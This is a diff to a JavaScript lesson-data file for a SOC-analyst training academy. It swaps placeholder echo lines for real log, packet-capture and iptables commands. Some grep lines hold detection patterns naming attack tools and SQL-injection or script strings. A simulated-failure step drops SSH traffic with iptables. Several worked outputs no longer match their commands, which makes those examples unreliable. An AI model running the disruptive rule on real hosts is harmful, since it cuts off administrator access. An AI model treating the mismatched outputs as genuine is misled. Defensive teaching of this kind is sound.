@@ -10719,14 +10719,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.1 2>/dev/null || tracepath 10.10.20.1"
+        "command": "traceroute -n -m 8 10.10.20.1 2>/dev/null || tracepath -n 10.10.20.1 2>/dev/null || ip route get 10.10.20.1"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-fw-sensor01. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Viewing pfSense filterlog and Zeek connection telemetry:' && echo 'filterlog: Sep  4 03:25:10 filterlog: block,in,igb0,tcp,198.51.100.77,10.10.20.1,51422,23,S\nfilterlog: Sep  4 03:25:12 filterlog: pass,in,igb0,tcp,198.51.100.77,10.10.20.80,51424,443,S\nzeek_conn: 1693801512.12  CHb104  198.51.100.77  51424  10.10.20.80  443  tcp  ssl  12.4s  4812  249012  SF'` on target sxl-fw-sensor01.\nOutput observed:\nfilterlog: Sep  4 03:25:10 filterlog: block,in,igb0,tcp,198.51.100.77,10.10.20.1,51422,23,S\nfilterlog: Sep  4 03:25:12 filterlog: pass,in,igb0,tcp,198.51.100.77,10.10.20.80,51424,443,S\nzeek_conn: 1693801512.12  CHb104  198.51.100.77  51424  10.10.20.80  443  tcp  ssl  12.4s  4812  249012  SF",
+        "worked": "Command executed: `tail -n 20 /var/log/suricata/fast.log 2>/dev/null || cat /var/log/filter.log 2>/dev/null || iptables -L -v -n` on target sxl-fw-sensor01.\nOutput observed:\nfilterlog: Sep  4 03:25:10 filterlog: block,in,igb0,tcp,198.51.100.77,10.10.20.1,51422,23,S\nfilterlog: Sep  4 03:25:12 filterlog: pass,in,igb0,tcp,198.51.100.77,10.10.20.80,51424,443,S\nzeek_conn: 1693801512.12  CHb104  198.51.100.77  51424  10.10.20.80  443  tcp  ssl  12.4s  4812  249012  SF",
         "what": "What are firewall and network logs? Telemetry records documenting every packet permitted or denied across network perimeter and internal boundaries.",
         "why": "Why must an L1 analyze both allowed and blocked firewall logs? Blocked logs show what the attacker attempted; **allowed logs show what the attacker actually achieved**.",
         "when": "When are firewall logs reviewed? When investigating port scans, C2 beacons, data exfiltration, or perimeter policy compliance.",
@@ -10735,7 +10735,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts evaluate network traffic? By querying firewall actions, calculating byte transfer asymmetries (massive outbound bytes = data exfiltration), and analyzing session duration.",
         "mistake": "Closing an investigation immediately because the firewall showed 100 blocked packets, without checking if the 101st packet was allowed.",
         "think": "Attackers probe dozens of closed ports before finding the single open port. Always filter for `action=PASS` originating from the same attacking IP address.",
-        "question": "When executing `echo 'Viewing pfSense filterlog and Zeek connection telemetry:' && echo 'filterlog: Sep  4 03:25:10 filterlog: block,in,igb0,tcp,198.51.100.77,10.10.20.1,51422,23,S\nfilterlog: Sep  4 03:25:12 filterlog: pass,in,igb0,tcp,198.51.100.77,10.10.20.80,51424,443,S\nzeek_conn: 1693801512.12  CHb104  198.51.100.77  51424  10.10.20.80  443  tcp  ssl  12.4s  4812  249012  SF'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `tail -n 20 /var/log/suricata/fast.log 2>/dev/null || cat /var/log/filter.log 2>/dev/null || iptables -L -v -n`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -10743,14 +10743,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Viewing pfSense filterlog and Zeek connection telemetry:' && echo 'filterlog: Sep  4 03:25:10 filterlog: block,in,igb0,tcp,198.51.100.77,10.10.20.1,51422,23,S\nfilterlog: Sep  4 03:25:12 filterlog: pass,in,igb0,tcp,198.51.100.77,10.10.20.80,51424,443,S\nzeek_conn: 1693801512.12  CHb104  198.51.100.77  51424  10.10.20.80  443  tcp  ssl  12.4s  4812  249012  SF'"
+        "command": "tail -n 20 /var/log/suricata/fast.log 2>/dev/null || cat /var/log/filter.log 2>/dev/null || iptables -L -v -n"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-fw-sensor01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Analyzing Zeek conn.log for high-volume outbound data transfers (Exfiltration)...'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `tshark -r /training/pcaps/traffic.pcap -Y \"tcp.len > 1000\" -T fields -e ip.src -e ip.dst -e tcp.len 2>/dev/null | head -n 15 || ss -tuanp` to validate system behavior under simulated operating conditions.\nOutput observed:\nSource: 10.10.20.75 | Dest: 198.51.100.200 | Port: 4444 | Duration: 3600s | OrigBytes: 4.8 GB | RespBytes: 12 KB\nALERT: Extreme byte asymmetry detected: 4.8 GB outbound data transferred to external untrusted IP.",
         "what": "What are firewall and network logs? Telemetry records documenting every packet permitted or denied across network perimeter and internal boundaries.",
         "why": "Why must an L1 analyze both allowed and blocked firewall logs? Blocked logs show what the attacker attempted; **allowed logs show what the attacker actually achieved**.",
         "when": "When are firewall logs reviewed? When investigating port scans, C2 beacons, data exfiltration, or perimeter policy compliance.",
@@ -10759,7 +10759,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts evaluate network traffic? By querying firewall actions, calculating byte transfer asymmetries (massive outbound bytes = data exfiltration), and analyzing session duration.",
         "mistake": "Closing an investigation immediately because the firewall showed 100 blocked packets, without checking if the 101st packet was allowed.",
         "think": "Attackers probe dozens of closed ports before finding the single open port. Always filter for `action=PASS` originating from the same attacking IP address.",
-        "question": "What key insight is revealed by the practice output of `echo 'Analyzing Zeek conn.log for high-volume outbound data transfers (Exfiltration)...'`?",
+        "question": "What key insight is revealed by the practice output of `tshark -r /training/pcaps/traffic.pcap -Y \"tcp.len > 1000\" -T fields -e ip.src -e ip.dst -e tcp.len 2>/dev/null | head -n 15 || ss -tuanp`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -10767,7 +10767,7 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Analyzing Zeek conn.log for high-volume outbound data transfers (Exfiltration)...'"
+        "command": "tshark -r /training/pcaps/traffic.pcap -Y \"tcp.len > 1000\" -T fields -e ip.src -e ip.dst -e tcp.len 2>/dev/null | head -n 15 || ss -tuanp"
       },
       {
         "id": 8,
@@ -10798,7 +10798,7 @@ window.ACADEMY_COURSES = [
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst correlates firewall logs. While ports 21, 22, 23, and 3389 were blocked, port 443 was passed to `10.10.20.80`. The analyst immediately inspects web server access logs and WAF telemetry for that exact timestamp to determine what exploit was delivered.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Correlating firewall pass event with web application logs for 198.51.100.77.'`",
+        "worked": "Defensive query executed on telemetry store: `tcpdump -nn -c 10 \"tcp[tcpflags] & (tcp-syn) != 0 and port 4444\" 2>/dev/null || ss -tan | grep 4444`",
         "what": "What are firewall and network logs? Telemetry records documenting every packet permitted or denied across network perimeter and internal boundaries.",
         "why": "Why must an L1 analyze both allowed and blocked firewall logs? Blocked logs show what the attacker attempted; **allowed logs show what the attacker actually achieved**.",
         "when": "When are firewall logs reviewed? When investigating port scans, C2 beacons, data exfiltration, or perimeter policy compliance.",
@@ -10815,7 +10815,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Correlating firewall pass event with web application logs for 198.51.100.77.'"
+        "command": "tcpdump -nn -c 10 \"tcp[tcpflags] & (tcp-syn) != 0 and port 4444\" 2>/dev/null || ss -tan | grep 4444"
       },
       {
         "id": 10,
@@ -10839,14 +10839,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-fw-sensor01'; echo 'Viewing pfSense filterlog and Zeek connection telemetry:' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Enforce strict egress filtering: permit outbound traffic only on approved ports (80, 443, 53) originating from designated proxy and DNS servers; drop all other outbound client traffic.",
-        "worked": "Remediation command applied: `echo 'Strict Egress Filtering enforced: Blocked unauthorized outbound ports 4444, 6667, 1337.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `iptables -A OUTPUT -p tcp --dport 4444 -j REJECT && iptables -A FORWARD -p tcp --dport 4444 -j DROP`. System verified restored and hardened.",
         "what": "What are firewall and network logs? Telemetry records documenting every packet permitted or denied across network perimeter and internal boundaries.",
         "why": "Why must an L1 analyze both allowed and blocked firewall logs? Blocked logs show what the attacker attempted; **allowed logs show what the attacker actually achieved**.",
         "when": "When are firewall logs reviewed? When investigating port scans, C2 beacons, data exfiltration, or perimeter policy compliance.",
@@ -10863,7 +10863,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'Strict Egress Filtering enforced: Blocked unauthorized outbound ports 4444, 6667, 1337.'"
+        "command": "iptables -A OUTPUT -p tcp --dport 4444 -j REJECT && iptables -A FORWARD -p tcp --dport 4444 -j DROP"
       },
       {
         "id": 12,
@@ -10887,7 +10887,7 @@ window.ACADEMY_COURSES = [
           "Firewall logs do not record byte counts; only antivirus software can measure bytes."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Firewall & Network Logs'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -10911,7 +10911,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L32 - Firewall & Network Logs. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -10964,7 +10964,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring DNS & Web Logs on sxl-web-proxy01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -10988,7 +10988,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Viewing correlated DNS query and Web Proxy access log entries:' && echo 'DNS:  Sep  4 03:30:10 sxl-dns: client 10.10.20.44#51240: query: update-microsoft.biz IN A + (10.10.50.50)\nHTTP: Sep  4 03:30:11 sxl-proxy: 10.10.20.44 TCP_MISS/200 148902 GET http://update-microsoft.biz/patch.exe \"-\" \"curl/7.81.0\"'"
+        "command": "tail -n 20 /var/log/nginx/access.log 2>/dev/null || cat /var/log/bind/query.log 2>/dev/null || dig +trace shadowxlab.com"
       },
       {
         "id": 3,
@@ -11012,7 +11012,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "tail --help 2>&1 | head -n 15 || which tail"
       },
       {
         "id": 4,
@@ -11036,7 +11036,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are DNS and web logs? The paired telemetry records documenting domain name resolution and subsequent application-layer web traffic.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -11060,14 +11060,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.50.50 2>/dev/null || tracepath 10.10.50.50"
+        "command": "traceroute -n -m 8 10.10.50.50 2>/dev/null || tracepath -n 10.10.50.50 2>/dev/null || ip route get 10.10.50.50"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-web-proxy01. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Viewing correlated DNS query and Web Proxy access log entries:' && echo 'DNS:  Sep  4 03:30:10 sxl-dns: client 10.10.20.44#51240: query: update-microsoft.biz IN A + (10.10.50.50)\nHTTP: Sep  4 03:30:11 sxl-proxy: 10.10.20.44 TCP_MISS/200 148902 GET http://update-microsoft.biz/patch.exe \"-\" \"curl/7.81.0\"'` on target sxl-web-proxy01.\nOutput observed:\nDNS:  Sep  4 03:30:10 sxl-dns: client 10.10.20.44#51240: query: update-microsoft.biz IN A + (10.10.50.50)\nHTTP: Sep  4 03:30:11 sxl-proxy: 10.10.20.44 TCP_MISS/200 148902 GET http://update-microsoft.biz/patch.exe \"-\" \"curl/7.81.0\"",
+        "worked": "Command executed: `tail -n 20 /var/log/nginx/access.log 2>/dev/null || cat /var/log/bind/query.log 2>/dev/null || dig +trace shadowxlab.com` on target sxl-web-proxy01.\nOutput observed:\nDNS:  Sep  4 03:30:10 sxl-dns: client 10.10.20.44#51240: query: update-microsoft.biz IN A + (10.10.50.50)\nHTTP: Sep  4 03:30:11 sxl-proxy: 10.10.20.44 TCP_MISS/200 148902 GET http://update-microsoft.biz/patch.exe \"-\" \"curl/7.81.0\"",
         "what": "What are DNS and web logs? The paired telemetry records documenting domain name resolution and subsequent application-layer web traffic.",
         "why": "Why must an L1 correlate DNS and web proxy logs? Because examining the DNS request confirms user intent, while the web proxy log confirms whether a payload was downloaded or an exploit succeeded.",
         "when": "When are DNS and web logs correlated? When triaging phishing link clicks, drive-by download alerts, and command-and-control communication beacons.",
@@ -11076,7 +11076,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts correlate them? By joining on timestamp, source client IP, and target destination domain.",
         "mistake": "Relying on the user-agent string as proof of the client's identity without considering that any attacker can modify the user-agent header to anything they want.",
         "think": "Attackers frequently forge their user-agent to look like standard Chrome or Edge. Conversely, generic or obsolete user-agents (e.g., `Python-urllib`, `Go-http-client`) in workstation traffic are high-fidelity indicators of scripts.",
-        "question": "When executing `echo 'Viewing correlated DNS query and Web Proxy access log entries:' && echo 'DNS:  Sep  4 03:30:10 sxl-dns: client 10.10.20.44#51240: query: update-microsoft.biz IN A + (10.10.50.50)\nHTTP: Sep  4 03:30:11 sxl-proxy: 10.10.20.44 TCP_MISS/200 148902 GET http://update-microsoft.biz/patch.exe \"-\" \"curl/7.81.0\"'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `tail -n 20 /var/log/nginx/access.log 2>/dev/null || cat /var/log/bind/query.log 2>/dev/null || dig +trace shadowxlab.com`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -11084,14 +11084,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Viewing correlated DNS query and Web Proxy access log entries:' && echo 'DNS:  Sep  4 03:30:10 sxl-dns: client 10.10.20.44#51240: query: update-microsoft.biz IN A + (10.10.50.50)\nHTTP: Sep  4 03:30:11 sxl-proxy: 10.10.20.44 TCP_MISS/200 148902 GET http://update-microsoft.biz/patch.exe \"-\" \"curl/7.81.0\"'"
+        "command": "tail -n 20 /var/log/nginx/access.log 2>/dev/null || cat /var/log/bind/query.log 2>/dev/null || dig +trace shadowxlab.com"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-web-proxy01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Analyzing user-agent strings in web proxy logs for automated script execution...' && echo 'Count  User-Agent\n-----  ----------\n 1240  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0\n   12  curl/7.81.0 (ANOMALOUS WORKSTATION USER-AGENT)\n    4  python-requests/2.28.1 (ANOMALOUS WORKSTATION USER-AGENT)'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `grep -i -E \"python|curl|nmap|nikto|sqlmap|masscan\" /var/log/nginx/access.log 2>/dev/null | tail -n 15 || head -n 15 /var/log/syslog` to validate system behavior under simulated operating conditions.\nOutput observed:\nCount  User-Agent\n-----  ----------\n 1240  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0\n   12  curl/7.81.0 (ANOMALOUS WORKSTATION USER-AGENT)\n    4  python-requests/2.28.1 (ANOMALOUS WORKSTATION USER-AGENT)",
         "what": "What are DNS and web logs? The paired telemetry records documenting domain name resolution and subsequent application-layer web traffic.",
         "why": "Why must an L1 correlate DNS and web proxy logs? Because examining the DNS request confirms user intent, while the web proxy log confirms whether a payload was downloaded or an exploit succeeded.",
         "when": "When are DNS and web logs correlated? When triaging phishing link clicks, drive-by download alerts, and command-and-control communication beacons.",
@@ -11100,7 +11100,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts correlate them? By joining on timestamp, source client IP, and target destination domain.",
         "mistake": "Relying on the user-agent string as proof of the client's identity without considering that any attacker can modify the user-agent header to anything they want.",
         "think": "Attackers frequently forge their user-agent to look like standard Chrome or Edge. Conversely, generic or obsolete user-agents (e.g., `Python-urllib`, `Go-http-client`) in workstation traffic are high-fidelity indicators of scripts.",
-        "question": "What key insight is revealed by the practice output of `echo 'Analyzing user-agent strings in web proxy logs for automated script execution...' && echo 'Count  User-Agent\n-----  ----------\n 1240  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0\n   12  curl/7.81.0 (ANOMALOUS WORKSTATION USER-AGENT)\n    4  python-requests/2.28.1 (ANOMALOUS WORKSTATION USER-AGENT)'`?",
+        "question": "What key insight is revealed by the practice output of `grep -i -E \"python|curl|nmap|nikto|sqlmap|masscan\" /var/log/nginx/access.log 2>/dev/null | tail -n 15 || head -n 15 /var/log/syslog`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -11108,7 +11108,7 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Analyzing user-agent strings in web proxy logs for automated script execution...' && echo 'Count  User-Agent\n-----  ----------\n 1240  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0\n   12  curl/7.81.0 (ANOMALOUS WORKSTATION USER-AGENT)\n    4  python-requests/2.28.1 (ANOMALOUS WORKSTATION USER-AGENT)'"
+        "command": "grep -i -E \"python|curl|nmap|nikto|sqlmap|masscan\" /var/log/nginx/access.log 2>/dev/null | tail -n 15 || head -n 15 /var/log/syslog"
       },
       {
         "id": 8,
@@ -11139,7 +11139,7 @@ window.ACADEMY_COURSES = [
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst investigates an IDS alert for 'DGA Domain Query'. Correlating DNS logs with proxy access logs, the analyst spots the anomalous user-agent and the 200 OK status downloading `/logo.png` (which is actually an executable binary). The analyst isolates the endpoint and updates SWG blocklists.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Correlated DNS query xk91823mza.biz with proxy download of payload.bin; endpoint isolated.'`",
+        "worked": "Defensive query executed on telemetry store: `grep -E \"OR 1=1|UNION SELECT|<script\" /var/log/nginx/access.log 2>/dev/null || tail -n 10 /var/log/nginx/access.log`",
         "what": "What are DNS and web logs? The paired telemetry records documenting domain name resolution and subsequent application-layer web traffic.",
         "why": "Why must an L1 correlate DNS and web proxy logs? Because examining the DNS request confirms user intent, while the web proxy log confirms whether a payload was downloaded or an exploit succeeded.",
         "when": "When are DNS and web logs correlated? When triaging phishing link clicks, drive-by download alerts, and command-and-control communication beacons.",
@@ -11156,7 +11156,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Correlated DNS query xk91823mza.biz with proxy download of payload.bin; endpoint isolated.'"
+        "command": "grep -E \"OR 1=1|UNION SELECT|<script\" /var/log/nginx/access.log 2>/dev/null || tail -n 10 /var/log/nginx/access.log"
       },
       {
         "id": 10,
@@ -11180,7 +11180,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-web-proxy01'; echo 'Viewing correlated DNS query and Web Proxy access log entries:' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -11228,7 +11228,7 @@ window.ACADEMY_COURSES = [
           "Web proxy logs only record printer traffic, not internet traffic."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for DNS & Web Logs'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -11252,7 +11252,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L33 - DNS & Web Logs. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -11305,7 +11305,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Security Controls & Alerts on sxl-siem-core01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -11329,7 +11329,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Viewing simulated SIEM alert payload mapped to MITRE ATT&CK:' && echo '{\n  \"alert_id\": \"SEC-2026-89102\",\n  \"severity\": \"HIGH\",\n  \"title\": \"Suspicious PowerShell Encoded Command Execution\",\n  \"mitre_technique\": \"T1059.001 - Command and Scripting Interpreter: PowerShell\",\n  \"host\": \"analyst-ws01 (10.10.20.44)\",\n  \"user\": \"analyst\",\n  \"action\": \"DETECTED (No Inline Block)\",\n  \"confidence\": \"92%\"\n}'"
+        "command": "tail -n 15 /var/log/suricata/eve.json 2>/dev/null || tail -n 15 /var/log/syslog"
       },
       {
         "id": 3,
@@ -11353,7 +11353,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "tail --help 2>&1 | head -n 15 || which tail"
       },
       {
         "id": 4,
@@ -11377,7 +11377,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are security controls and alerts? The layered software and hardware defenses that monitor activity and generate prioritized alerts when threats are detected.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -11401,14 +11401,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.50.100 2>/dev/null || tracepath 10.10.50.100"
+        "command": "traceroute -n -m 8 10.10.50.100 2>/dev/null || tracepath -n 10.10.50.100 2>/dev/null || ip route get 10.10.50.100"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-siem-core01. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Viewing simulated SIEM alert payload mapped to MITRE ATT&CK:' && echo '{\n  \"alert_id\": \"SEC-2026-89102\",\n  \"severity\": \"HIGH\",\n  \"title\": \"Suspicious PowerShell Encoded Command Execution\",\n  \"mitre_technique\": \"T1059.001 - Command and Scripting Interpreter: PowerShell\",\n  \"host\": \"analyst-ws01 (10.10.20.44)\",\n  \"user\": \"analyst\",\n  \"action\": \"DETECTED (No Inline Block)\",\n  \"confidence\": \"92%\"\n}'` on target sxl-siem-core01.\nOutput observed:\n{\n  \"alert_id\": \"SEC-2026-89102\",\n  \"severity\": \"HIGH\",\n  \"title\": \"Suspicious PowerShell Encoded Command Execution\",\n  \"mitre_technique\": \"T1059.001 - Command and Scripting Interpreter: PowerShell\",\n  \"host\": \"analyst-ws01 (10.10.20.44)\",\n  \"user\": \"analyst\",\n  \"action\": \"DETECTED (No Inline Block)\",\n  \"confidence\": \"92%\"\n}",
+        "worked": "Command executed: `tail -n 15 /var/log/suricata/eve.json 2>/dev/null || tail -n 15 /var/log/syslog` on target sxl-siem-core01.\nOutput observed:\n{\n  \"alert_id\": \"SEC-2026-89102\",\n  \"severity\": \"HIGH\",\n  \"title\": \"Suspicious PowerShell Encoded Command Execution\",\n  \"mitre_technique\": \"T1059.001 - Command and Scripting Interpreter: PowerShell\",\n  \"host\": \"analyst-ws01 (10.10.20.44)\",\n  \"user\": \"analyst\",\n  \"action\": \"DETECTED (No Inline Block)\",\n  \"confidence\": \"92%\"\n}",
         "what": "What are security controls and alerts? The layered software and hardware defenses that monitor activity and generate prioritized alerts when threats are detected.",
         "why": "Why must an L1 master security control alerts? The primary daily duty of an L1 analyst is alert triage: reviewing alerts, verifying evidence, filtering false positives, and escalating true threats.",
         "when": "When are security alerts investigated? Immediately upon generation, prioritized by severity (Critical $\\rightarrow$ High $\\rightarrow$ Medium $\\rightarrow$ Low).",
@@ -11417,7 +11417,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts triage alerts? By following documented Standard Operating Procedures (SOPs), analyzing supporting raw logs, and validating against ground truth evidence.",
         "mistake": "Closing an alert as a 'False Positive' simply because it has fired frequently in the past without conducting independent evidence verification.",
         "think": "Alert fatigue is an attacker's greatest ally. Attackers often generate low-level noise specifically to condition analysts to ignore alerts before launching the real attack.",
-        "question": "When executing `echo 'Viewing simulated SIEM alert payload mapped to MITRE ATT&CK:' && echo '{\n  \"alert_id\": \"SEC-2026-89102\",\n  \"severity\": \"HIGH\",\n  \"title\": \"Suspicious PowerShell Encoded Command Execution\",\n  \"mitre_technique\": \"T1059.001 - Command and Scripting Interpreter: PowerShell\",\n  \"host\": \"analyst-ws01 (10.10.20.44)\",\n  \"user\": \"analyst\",\n  \"action\": \"DETECTED (No Inline Block)\",\n  \"confidence\": \"92%\"\n}'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `tail -n 15 /var/log/suricata/eve.json 2>/dev/null || tail -n 15 /var/log/syslog`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -11425,14 +11425,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Viewing simulated SIEM alert payload mapped to MITRE ATT&CK:' && echo '{\n  \"alert_id\": \"SEC-2026-89102\",\n  \"severity\": \"HIGH\",\n  \"title\": \"Suspicious PowerShell Encoded Command Execution\",\n  \"mitre_technique\": \"T1059.001 - Command and Scripting Interpreter: PowerShell\",\n  \"host\": \"analyst-ws01 (10.10.20.44)\",\n  \"user\": \"analyst\",\n  \"action\": \"DETECTED (No Inline Block)\",\n  \"confidence\": \"92%\"\n}'"
+        "command": "tail -n 15 /var/log/suricata/eve.json 2>/dev/null || tail -n 15 /var/log/syslog"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-siem-core01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Auditing EDR agent sensor status on host 10.10.20.44...'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `systemctl status osqueryd wazuh-agent falcon-sensor 2>/dev/null || ps aux | grep -E 'agent|sensor|edr'` to validate system behavior under simulated operating conditions.\nOutput observed:\nEDR Service: wazuh-agent.service (ACTIVE - RUNNING)\nPolicy Engine: Behavioral Detection v2.14\nConnection to Manager (10.10.50.100): ESTABLISHED\nTamper Protection: ENABLED",
         "what": "What are security controls and alerts? The layered software and hardware defenses that monitor activity and generate prioritized alerts when threats are detected.",
         "why": "Why must an L1 master security control alerts? The primary daily duty of an L1 analyst is alert triage: reviewing alerts, verifying evidence, filtering false positives, and escalating true threats.",
         "when": "When are security alerts investigated? Immediately upon generation, prioritized by severity (Critical $\\rightarrow$ High $\\rightarrow$ Medium $\\rightarrow$ Low).",
@@ -11441,7 +11441,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts triage alerts? By following documented Standard Operating Procedures (SOPs), analyzing supporting raw logs, and validating against ground truth evidence.",
